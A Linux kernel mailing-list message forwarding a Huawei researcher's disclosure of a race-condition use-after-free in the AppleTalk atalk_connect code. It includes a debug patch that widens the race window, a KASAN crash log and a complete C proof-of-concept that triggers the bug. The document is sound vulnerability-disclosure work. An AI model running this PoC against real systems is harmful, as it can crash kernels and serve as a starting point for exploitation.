Return-Path: <netdev+bounces-38741-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id 01C8D7BC506
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:36:35 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 83C432820D9
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:36:34 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 447891FCC;
	Sat,  7 Oct 2023 06:36:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dkim=none
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E65589CA5E
	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:36:28 +0000 (UTC)
Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id BB353C6
	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:36:25 -0700 (PDT)
Received: (from willy@localhost)
	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976a95K021164;
	Sat, 7 Oct 2023 08:36:09 +0200
Date: Sat, 7 Oct 2023 08:36:09 +0200
From: Willy Tarreau <w@1wt.eu>
To: netdev@vger.kernel.org
Cc: rootlab@huawei.com
Subject: Fwd: Race Condition Vulnerability in atalk_connect of appletalk
 module leading to UAF
Message-ID: <20231007063609.GR20998@1wt.eu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_PASS,SPF_PASS autolearn=ham
	autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

Hello,

Sili Luo of Huawei sent this to the security list. Eric and I think it
does not deserve special handling from the security team and will be
better addressed here.

Regards,
Willy

PS: there are 6 reports for atalk in this series.

----- Forwarded message from rootlab <rootlab@huawei.com> -----

> Date: Sat, 7 Oct 2023 03:09:13 +0000
> From: rootlab <rootlab@huawei.com>
> Subject: Race Condition Vulnerability in atalk_connect of appletalk module leading to UAF
> To: "security@kernel.org" <security@kernel.org>
> Delivered-To: security@kernel.org
> 
> I recently found an race condition Vulnerability in the atalk_connect, which leads to the kernel access free'd atalk_route object.
> 
> The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
> 
> [Root Cause]
> 
> atalk_connect first obtain the lock of sk, then use atrtr_get_dev to obtain atr from atalk_routes.
> 
>   *   atalk_connect
> 
>      *   lock_sock(sk);
> 
>      *   atrtr_get_dev
> 
>         *   struct atalk_route *atr = atrtr_find(sa);
>         *   return atr ? atr->dev : NULL; // race to uaf
>      *   release_sock(sk);
> 
> atr can be free through ioctl(at_fd, SIOCDIFADDR, &atreq);.
> 
> atalk_ioctl
> 
>   *   rtnl_lock();
> 
>      *   SIOCDIFADDR
> 
>         *   atalk_dev_down
> 
>            *   atrtr_device_down
> 
>               *   kfree(tmp);
>   *   rtnl_unlock();
> 
> During the atalk_ioctl --> atrtr_device_down process, only the rtnl lock is obtained.
> 
> Inconsistency between the rtnl lock and the atalk_connect lock causes UAF.
> 
>                           Time
>                            +
>                            |
> thread A                   |  thread B
> atalk_connect              |  ioctl --> atalk_dev_down
>                            |
>                            |
>   1.atr = atrtr_find(sa);  |
>                            |
>                            |
>                            |     2.atrtr_device_down(dev) --> free atr
>                            |
>                            |
>     // UAF!                |
>   3.return atr ? atr->dev  |
>                            +
> 
> 
> [Patch Suggestion]
> 
>   1.  add refcount for struct atalk_route
>   2.  Use the right lock
> 
> [Proof-of-Concept]
> 
> The POC is at the end of the email.
> 
> Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
> 
> To increase the probability of race, I add some loops to the race part of the code ( atrtr_get_dev ) to increase the time window.
> 
> the dxxx() function just do some loop to increase the time window.
> 
> From 015bb1b6834e0abeb87f4f85505b93dfcd69f96e Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 17:16:32 +0800
> Subject: [PATCH] appletalk: patch for race in atalk_connect
> 
> add some loop for race.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 15 +++++++++++++++
>  1 file changed, 15 insertions(+)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..c27244ae1352 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -468,6 +468,18 @@ static struct atalk_route *atrtr_find(struct atalk_addr *target)
>         return r;
>  }
> 
> +#pragma GCC push_options
> +#pragma GCC optimize ("O0")
> +noinline u64 dxxx(void)
> +{
> +       u64 xxx = 0;
> +       for (size_t i = 0; i < 100000000; i++) {
> +               xxx *= 0x241;
> +               xxx += 0x1234;
> +       }
> +       return xxx;
> +}
> +#pragma GCC pop_options
> 
>  /*
>   * Given an AppleTalk network, find the device to use. This can be
> @@ -476,6 +488,9 @@ static struct atalk_route *atrtr_find(struct atalk_addr *target)
>  struct net_device *atrtr_get_dev(struct atalk_addr *sa)
>  {
>         struct atalk_route *atr = atrtr_find(sa);
> +       printk("vuln: [atrtr_get_dev] %llx\n", (uint64_t)atr);
> +       dxxx();
> +       printk("vuln: [atrtr_get_dev] do use %llx\n", (uint64_t)atr);
>         return atr ? atr->dev : NULL;
>  }
> 
> --
> 2.25.1
> 
> 
> 
> panic log
> 
> 
> # /tmp/atalk_connect
> fd: 3
> use done
> [43541.222459] vuln: [atrtr_get_dev] ffff8880079e1cc0
> [43541.712371] vuln: [atrtr_get_dev] do use ffff8880079e1cc0
> [43541.713198] ==================================================================
> [43541.713963] BUG: KASAN: slab-use-after-free in atrtr_get_dev+0x47/0x60 [appletalk]
> [43541.714780] Read of size 8 at addr ffff8880079e1cc0 by task atalk_connect/338
> [43541.715536]
> [43541.715711] CPU: 1 PID: 338 Comm: atalk_connect Tainted: G           OE      6.5.0-rc5 #7
> [43541.716516] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
> [43541.717422] Call Trace:
> [43541.717693]  <TASK>
> [43541.717916]  dump_stack_lvl+0x4c/0x70
> [43541.718305]  print_report+0xd3/0x620
> [43541.718669]  ? kasan_complete_mode_report_info+0x7d/0x200
> [43541.719188]  ? atrtr_get_dev+0x47/0x60 [appletalk]
> [43541.719702]  kasan_report+0xc2/0x100
> [43541.720128]  ? atrtr_get_dev+0x47/0x60 [appletalk]
> [43541.720637]  __asan_load8+0x82/0xb0
> [43541.720980]  atrtr_get_dev+0x47/0x60 [appletalk]
> [43541.721413]  atalk_connect+0xcb/0x210 [appletalk]
> [43541.721848]  ? apparmor_socket_connect+0x2f/0x40
> [43541.722421]  __sys_connect_file+0xd1/0xf0
> [43541.722870]  ? __pfx_atalk_connect+0x10/0x10 [appletalk]
> [43541.723462]  __sys_connect+0x114/0x140
> [43541.723862]  ? __pfx___sys_connect+0x10/0x10
> [43541.724334]  ? __kasan_slab_free+0x139/0x1c0
> [43541.724791]  ? free_cpumask_var+0xd/0x20
> [43541.725219]  ? __pfx_restore_fpregs_from_fpstate+0x10/0x10
> [43541.725818]  ? __kasan_check_write+0x18/0x20
> [43541.726280]  __x64_sys_connect+0x47/0x60
> [43541.726711]  do_syscall_64+0x60/0x90
> [43541.727117]  ? syscall_exit_to_user_mode+0x2a/0x50
> [43541.727630]  ? do_syscall_64+0x6d/0x90
> [43541.728030]  ? __kasan_check_read+0x15/0x20
> [43541.728486]  ? fpregs_assert_state_consistent+0x62/0x70
> [43541.729058]  ? exit_to_user_mode_prepare+0x3d/0x190
> [43541.729592]  ? syscall_exit_to_user_mode+0x2a/0x50
> [43541.730115]  ? do_syscall_64+0x6d/0x90
> [43541.730527]  ? syscall_exit_to_user_mode+0x2a/0x50
> [43541.731035]  ? ret_from_fork+0x2d/0x70
> [43541.731305]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [43541.731746] RIP: 0033:0x406dfb
> [43541.732058] Code: 83 ec 18 89 54 24 0c 48 89 34 24 89 7c 24 08 e8 0b fd ff ff 8b 54 24 0c 48 8b 34 24 41 89 c0 8b 7c 24 08 b8 2a 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 2f 44 89 c7 89 44 24 08 e8 41 fd ff ff 8b 44
> [43541.733896] RSP: 002b:00007ff49ed5ad70 EFLAGS: 00000293 ORIG_RAX: 000000000000002a
> [43541.734678] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000406dfb
> [43541.735389] RDX: 0000000000000010 RSI: 00007ff49ed5ad90 RDI: 0000000000000003
> [43541.736116] RBP: 00007ff49ed5adb0 R08: 0000000000000000 R09: 00007ff49ed5b700
> [43541.736842] R10: 00007ff49ed5b9d0 R11: 0000000000000293 R12: 00007fffb962df1e
> [43541.737593] R13: 00007fffb962df1f R14: 00007fffb962df20 R15: 00007ff49ed5ae80
> [43541.738328]  </TASK>
> [43541.738568]
> [43541.738746] Allocated by task 336:
> [43541.739138]  kasan_save_stack+0x2a/0x50
> [43541.739669]  kasan_set_track+0x29/0x40
> [43541.741599]  kasan_save_alloc_info+0x1f/0x30
> [43541.741984]  __kasan_kmalloc+0xb5/0xc0
> [43541.742391]  kmalloc_trace+0x4e/0xb0
> [43541.742759]  atrtr_create+0x29a/0x3e0 [appletalk]
> [43541.743199]  atif_ioctl+0x45c/0x6c0 [appletalk]
> [43541.743629]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [43541.744086]  sock_do_ioctl+0xb9/0x1a0
> [43541.744445]  sock_ioctl+0x1b1/0x420
> [43541.744772]  __x64_sys_ioctl+0xd1/0x110
> [43541.745139]  do_syscall_64+0x60/0x90
> [43541.745633]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [43541.746253]
> [43541.746419] Freed by task 337:
> [43541.746777]  kasan_save_stack+0x2a/0x50
> [43541.747179]  kasan_set_track+0x29/0x40
> [43541.747556]  kasan_save_free_info+0x2f/0x50
> [43541.747977]  __kasan_slab_free+0x12e/0x1c0
> [43541.748397]  __kmem_cache_free+0x1b9/0x380
> [43541.748810]  kfree+0x7a/0x120
> [43541.749144]  atrtr_device_down+0xab/0x120 [appletalk]
> [43541.749591]  atif_ioctl+0x1db/0x6c0 [appletalk]
> [43541.749986]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [43541.750373]  sock_do_ioctl+0xb9/0x1a0
> [43541.750694]  sock_ioctl+0x1b1/0x420
> [43541.750995]  __x64_sys_ioctl+0xd1/0x110
> [43541.751319]  do_syscall_64+0x60/0x90
> [43541.751662]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [43541.752099]
> [43541.752262] The buggy address belongs to the object at ffff8880079e1cc0
> [43541.752262]  which belongs to the cache kmalloc-32 of size 32
> [43541.753428] The buggy address is located 0 bytes inside of
> [43541.753428]  freed 32-byte region [ffff8880079e1cc0, ffff8880079e1ce0)
> [43541.754380]
> [43541.754507] The buggy address belongs to the physical page:
> [43541.754912] page:0000000090d1c415 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x79e1
> [43541.755592] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
> [43541.756080] page_type: 0xffffffff()
> [43541.756358] raw: 000fffffc0000200 ffff888006842500 ffffea00001fbf80 dead000000000002
> [43541.757002] raw: 0000000000000000 0000000080400040 00000001ffffffff 0000000000000000
> [43541.757761] page dumped because: kasan: bad access detected
> [43541.758315]
> [43541.758480] Memory state around the buggy address:
> [43541.758965]  ffff8880079e1b80: fa fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
> [43541.759665]  ffff8880079e1c00: fa fb fb fb fc fc fc fc 00 00 00 fc fc fc fc fc
> [43541.760348] >ffff8880079e1c80: fb fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
> [43541.761090]                                            ^
> [43541.761609]  ffff8880079e1d00: fa fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
> [43541.762223]  ffff8880079e1d80: 00 00 00 fc fc fc fc fc fa fb fb fb fc fc fc fc
> [43541.762896] ==================================================================
> [43541.763645] Disabling lock debugging due to kernel taint
> #
> 
> 
> [CREDIT]
> 
> Sili Luo
> RO0T Lab of Huawei
> 
> poc
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <linux/if_tun.h>
> #include <linux/atalk.h>
> #include <net/if.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
> 
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <arpa/inet.h>
> #include <linux/if_packet.h>
> #include <net/ethernet.h>
> #include <netinet/if_ether.h>
> #include <netinet/in.h>
> #include <netinet/ip.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <net/route.h>
> 
> 
> void pincpu(int cpu) {
>   cpu_set_t set;
>   CPU_ZERO(&set);
>   CPU_SET(cpu, &set);
>   if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
>     perror("setaffinity");
>   }
> }
> 
> int at_fd;
> 
> #define THREAD_NUMS 2
> pthread_barrier_t barrier;
> 
> void free_thread() {
>   pincpu(0);
> 
>   srand(time(NULL));
> 
> 
>   usleep(15000);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> }
> 
> void use_thread() {
>   pincpu(1);
> 
>   struct sockaddr_at addr = {0};
>   addr.sat_family = AF_APPLETALK;           // ?????
>   addr.sat_addr.s_net == 0x33;
>   addr.sat_addr.s_node == 0x32;
>   addr.sat_port == 0;
>   connect(at_fd, (struct sockaddr *)&addr, sizeof(addr));
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt2() {
>   int sockfd;
>   struct sockaddr_ll sa;
>   struct ether_header eth_header;
>   struct iphdr ip_header;
>   char packet[ETH_FRAME_LEN];
>   char *interface = "lo"; // Replace with your desired interface name
> 
>   // Create socket
>   sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_PPPTALK));
>   if (sockfd == -1) {
>     perror("socket");
>     return 1;
>   }
> 
>   // Set interface index
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = AF_PACKET;
>   sa.sll_protocol = htons(ETH_P_PPPTALK);
>   sa.sll_ifindex = if_nametoindex(interface);
> 
>   // Set Ethernet header
>   memset(&eth_header, 0, sizeof(struct ether_header));
>   eth_header.ether_shost[0] = 0x00; // Source MAC address
>   eth_header.ether_shost[1] = 0x11;
>   eth_header.ether_shost[2] = 0x22;
>   eth_header.ether_shost[3] = 0x33;
>   eth_header.ether_shost[4] = 0x44;
>   eth_header.ether_shost[5] = 0x55;
>   eth_header.ether_dhost[0] = 0x66; // Destination MAC address
>   eth_header.ether_dhost[1] = 0x77;
>   eth_header.ether_dhost[2] = 0x88;
>   eth_header.ether_dhost[3] = 0x99;
>   eth_header.ether_dhost[4] = 0xAA;
>   eth_header.ether_dhost[5] = 0xBB;
>   eth_header.ether_type = htons(ETH_P_X25);
> 
>   // Set IP header
>   memset(&ip_header, 0x22, sizeof(struct iphdr));
> 
>   memcpy(packet, &eth_header, sizeof(struct ether_header));
> 
>   uint8_t *ptr = packet + sizeof(struct ether_header);
> 
>   *(uint64_t *)ptr = 0x11223344;
> 
>   // Send the packet
>   if (sendto(sockfd, packet, sizeof(struct ether_header) + 4, 0,
>              (struct sockaddr *)&sa, sizeof(struct sockaddr_ll)) == -1) {
>     perror("sendto");
>     return 1;
>   }
> 
>   printf("Packet sent successfully.\n");
> 
>   // Close the socket
>   close(sockfd);
> 
>   return 0;
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt() {
>   // ???????
>   int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_X25));
>   if (sockfd == -1) {
>     perror("Socket creation failed");
>     exit(EXIT_FAILURE);
>   }
> 
>   // ??socket????
>   struct sockaddr_ll sa;
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = AF_PACKET;
>   sa.sll_protocol = htons(ETH_P_X25);
> 
>   // ??????
>   sa.sll_ifindex = if_nametoindex("eth0");
>   if (sa.sll_ifindex == 0) {
>     perror("Interface not found");
>     close(sockfd);
>     exit(EXIT_FAILURE);
>   }
> 
>   // ??X.25???
>   char packet[] = {0x00, 0x00, 0x00, 0x00, // X.25?
>                    // ??X.25?????
>                    0x11, 0x22, 0x33};
> 
>   // ?????
>   if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sa,
>              sizeof(struct sockaddr_ll)) == -1) {
>     perror("Packet sending failed");
>     close(sockfd);
>     exit(EXIT_FAILURE);
>   }
> 
>   printf("Packet sent successfully\n");
> 
>   // ?????
>   close(sockfd);
> 
>   return 0;
> }
> 
> int main() {
> 
>   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
>   printf("fd: %d\n", at_fd);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCSIFADDR, &atreq);
> 
>   struct rtentry rt = {0};
>   char name[] = "lo";
>   rt.rt_dev = name;
> 
>         struct sockaddr_at *ta = (struct sockaddr_at *)&rt.rt_dst;
>         struct sockaddr_at *ga = (struct sockaddr_at *)&rt.rt_gateway;
>   ta->sat_family = AF_APPLETALK;
>   ga->sat_family = AF_APPLETALK;
>   ta->sat_addr.s_net = 0x33;
>   ta->sat_addr.s_node = 0x32;
> 
> 
>   ioctl(at_fd, SIOCADDRT, &rt);
> 
> 
> 
> 
>   puts("use done");
> 
> //   send_pkt2();
> 
>   // return;
> 
>   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
> 
>   pthread_t ids[2] = {0};
>   pthread_create(&ids[0], NULL, (void *)free_thread, NULL);
>   pthread_create(&ids[1], NULL, (void *)use_thread, NULL);
> 
>   pthread_join(ids[0], NULL);
>   pthread_join(ids[1], NULL);
> 
>   sleep(1);
> }
> 
> 

----- End forwarded message -----

